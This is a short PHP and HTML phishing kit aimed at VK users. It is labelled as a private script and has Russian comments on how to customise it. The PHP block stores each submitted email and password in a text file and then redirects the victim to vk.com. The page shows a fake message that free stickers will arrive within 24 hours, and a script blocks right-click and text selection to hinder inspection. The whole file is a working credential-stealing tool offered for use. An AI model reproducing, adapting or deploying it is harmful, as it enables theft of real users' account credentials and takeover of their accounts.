<?PHP
//**Private-Skripts**\\
//**Скриптик**\\
$Log = $_POST['email'];
$Pass = $_POST['pass'];
$log = fopen("baza vk.txt","at");//тут короче название куда будут сохрянться.txt
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com'></head></html>";//ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,600,800" rel="stylesheet">
<style type="text/css">
h2 {
position: bottom;
font-family: 'Roboto', sans-serif;
font-weight: 600;
}

h3 {
position: bottom;
font-family: 'Roboto', sans-serif;
font-weight: 400;
}
</style>
</head>
<body>
<center>
<h2>Стикеры поступят в течение 24-х часов.</h2>
<h3>Если ваша заявка будет принята мы отправим вам сообщение на страницу с который была отправлена заявку.</h3>
<img src="yes.jpg" width="300" height="300">
</center>
<script type="text/javascript">document.ondragstart = noselect;document.onselectstart = noselect;document.oncontextmenu = noselect;function noselect() {return false;}document.body.onkeydown = function(e){e = e || window.event;var c = e.keyCode;if(c>36 && c<41 || c>32 && c<37) return false;}</script>
</body>
</html>